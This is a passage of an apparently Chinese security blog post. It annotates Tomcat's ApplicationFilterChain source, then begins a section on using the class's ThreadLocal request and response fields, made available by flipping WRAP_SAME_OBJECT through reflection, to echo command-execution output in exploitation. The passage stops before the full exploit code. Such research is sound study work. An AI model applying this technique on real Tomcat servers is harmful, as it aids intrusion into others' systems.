class="line"></span><br><span class="line">    <span class="comment">// 返回最终设置好的ApplicationFilterConfig对象</span></span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="源码浅析"><a href="#源码浅析" class="headerlink" title="源码浅析"></a>源码浅析</h4><p>这里直接从ApplicationFilterChain类源码中看注释分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of &lt;code&gt;javax.servlet.FilterChain&lt;/code&gt; used to manage</span></span><br><span class="line"><span class="comment"> * the execution of a set of filters for a particular request.  When the</span></span><br><span class="line"><span class="comment"> * set of defined filters has all been executed, the next call to</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;doFilter()&lt;/code&gt; will execute the servlet's &lt;code&gt;service()&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * method itself.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Craig R. McClanahan</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title">FilterChain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在ApplicationFilterChain类首次创建时调用</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// WRAP_SAME_OBJECT默认为空</span></span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">            lastServicedResponse = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lastServicedRequest = <span class="keyword">null</span>;</span><br><span class="line">            lastServicedResponse = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// filters数组每次扩容的增量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INCREMENT = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> ApplicationFilterConfig[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前执行的filter索引index</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// filters总量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// filter之后执行的Servlet实例</span></span><br><span class="line">    <span class="keyword">private</span> Servlet servlet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关联的servlet实例是否支持异步处理</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> servletSupportsAsync = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The string manager for our package.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> StringManager sm =</span><br><span class="line">      StringManager.getManager(Constants.Package);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Static class array used when the SecurityManager is turned on and</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;doFilter&lt;/code&gt; is invoked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Class&lt;?&gt;[] classType = <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        ServletRequest.class, ServletResponse.class, FilterChain.class&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Static class array used when the SecurityManager is turned on and</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;service&lt;/code&gt; is invoked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Class&lt;?&gt;[] classTypeUsedInService = <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        ServletRequest.class, ServletResponse.class&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用filter chain中的下一个filter，并传递指定的请求和响应。如果filter chain中没有其他filter，则调用Servlet本身的service()方法</span></span><br><span class="line">    <span class="comment">// 该函数主要进行一层安全验证处理，再内部调用internalDoFilter()做实际处理</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 是否开启Security Manager</span></span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">            <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            <span class="comment">// 内部调用进一步处理</span></span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">                Exception e = pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException)</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException)</span><br><span class="line">                    <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 内部调用进一步处理</span></span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实际处理的Filter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用下一个存在的filter</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="comment">// 根据pos定位找到ApplicationFilterConfig</span></span><br><span class="line">            ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 从ApplicationFilterConfig获取新的filter</span></span><br><span class="line">                Filter filter = filterConfig.getFilter();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">"false"</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 判断是否启用Security Manager</span></span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">                    <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">                    Principal principal =</span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                    Object[] args = <span class="keyword">new</span> Object[]&#123;req, res, <span class="keyword">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">"doFilter"</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 调用用户编写的Filter中的方法进行过滤</span></span><br><span class="line">                    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">                ExceptionUtils.handleThrowable(e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(sm.getString(<span class="string">"filterChain.filter"</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// filter chain执行完后，调用servlet实例</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 保存Servlet执行前的request与response，前提是WRAP_SAME_OBJECT不为空</span></span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                        Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Use potentially wrapped request from this point</span></span><br><span class="line">            <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                    (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                    Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">                <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">                Principal principal =</span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> Object[]&#123;req, res&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">"service"</span>,</span><br><span class="line">                                           servlet,</span><br><span class="line">                                           classTypeUsedInService,</span><br><span class="line">                                           args,</span><br><span class="line">                                           principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// servlet实例的service()方法调用</span></span><br><span class="line">                servlet.service(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(sm.getString(<span class="string">"filterChain.servlet"</span>), e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>);</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取最后一个从当前线程传递到servlet进行服务的请求</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title">getLastServicedRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lastServicedRequest.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取最后一个从当前线程传递到servlet进行服务的响应</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ServletResponse <span class="title">getLastServicedResponse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lastServicedResponse.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加filter到filter chain</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 防止添加重复的filter</span></span><br><span class="line">        <span class="keyword">for</span>(ApplicationFilterConfig filter:filters)</span><br><span class="line">            <span class="keyword">if</span>(filter==filterConfig)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果filters数量满额</span></span><br><span class="line">        <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">            <span class="comment">// 以INCREMENT为单位扩容</span></span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                <span class="keyword">new</span> ApplicationFilterConfig[n + INCREMENT];</span><br><span class="line">            <span class="comment">// 数组内容copy</span></span><br><span class="line">            System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">            <span class="comment">// 引用替换</span></span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 扩容后再添加新的filter</span></span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Release references to the filters and wrapper executed by this chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">release</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            filters[i] = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        n = <span class="number">0</span>;</span><br><span class="line">        pos = <span class="number">0</span>;</span><br><span class="line">        servlet = <span class="keyword">null</span>;</span><br><span class="line">        servletSupportsAsync = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Prepare for reuse of the filters and wrapper executed by this chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reuse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        pos = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置filter chain之后将执行的Servlet</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setServlet</span><span class="params">(Servlet servlet)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.servlet = servlet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置Servlet支持异步</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setServletSupportsAsync</span><span class="params">(<span class="keyword">boolean</span> servletSupportsAsync)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.servletSupportsAsync = servletSupportsAsync;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找不支持异步的filter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findNonAsyncFilters</span><span class="params">(Set&lt;String&gt; result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++) &#123;</span><br><span class="line">            ApplicationFilterConfig filter = filters[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"false"</span>.equalsIgnoreCase(filter.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                result.add(filter.getFilterClass());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完代码，我们可以简介归纳一个ApplicationFilterChain对象包含几个主要参数：</p><ul><li>n：filter个数；</li><li>pos：下一个要执行的filter的位置；</li><li>Servlet：当pos=n即过滤完成时，调用Servlet的service()方法，把请求交给Servlet；</li><li>filters：Filter的相关配置信息；</li></ul><p>所以，ApplicationFilterChain对象的执行其实就是通过pos作为索引来逐个执行设置的filter的doFilter()函数，执行完所有filter的doFilter()后，就会调用Servlet的service()函数来处理请求。</p><h2 id="0x02-回显利用"><a href="#0x02-回显利用" class="headerlink" title="0x02 回显利用"></a>0x02 回显利用</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>一般的，基于Tomcat的回显利用实现思路如下：</p><ol><li>Tomcat中存在保存Request和Response的某些变量；</li><li>通过读取Request对象来获取输入的命令参数；</li><li>通过写入Response对象来实现响应回显输出；</li></ol><p>而在前面分析的ApplicationFilterChain类中，我们看到在调用internalDoFilter()函数时，Request和Response是保存到lastServicedRequest和lastServicedResponse变量中的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(request);</span><br><span class="line">        lastServicedResponse.set(response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这两个变量是由private static final修饰的ThreadLocal类型的变量，static使得可以直接在没有创建对象的情况下来获取变量，<code>ThreadLocal的作用主要是做数据隔离，填充的数据只属于当前线程，变量的数据对别的线程而言是相对隔离的，在多线程环境下，如何防止自己的变量被其它线程篡改</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br></pre></td></tr></table></figure><p>下面具体看看怎么实现回显。</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>本地起个简易的Spring Boot，其中Controller代码如下，尝试获取当前HttpServletResponse内容和输入的input参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(String input, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(httpServletResponse);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        input = <span class="string">"Echo Page"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试看调用栈，该Response实例在函数调用栈中始终是同一个传递下来的：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/3.png" alt=""></p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/4.png" alt=""></p><p>这里理一下，我们的目标是要在本Controller的响应中添加命令执行的回显到页面中。</p><p>在前面的源码浅析中，我们知道ApplicationFilterChain这个类的internalDoFilter()函数中，会将当前的ServletRequest和ServletResponse保存到其成员变量lastServicedRequest和lastServicedResponse中，当然前提是ApplicationDispatcher.WRAP_SAME_OBJECT为true（默认为false）：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/5.png" alt=""></p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/6.png" alt=""></p><p>看到WRAP_SAME_OBJECT是个static final变量，问题不大，可以通过反射来修改其值为true，从而使得程序能跑到if逻辑中让当前的ServletRequest和ServletResponse保存到lastServicedRequest和lastServicedResponse中。</p><p>具体怎么修改可以参考网上的文章：<a href="https://www.cnblogs.com/fudashi/p/6624379.html" target="_blank" rel="noopener">利用反射修改final数据域</a></p><p>先尝试写了下，代码说明如注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(String input, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(httpServletResponse);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) 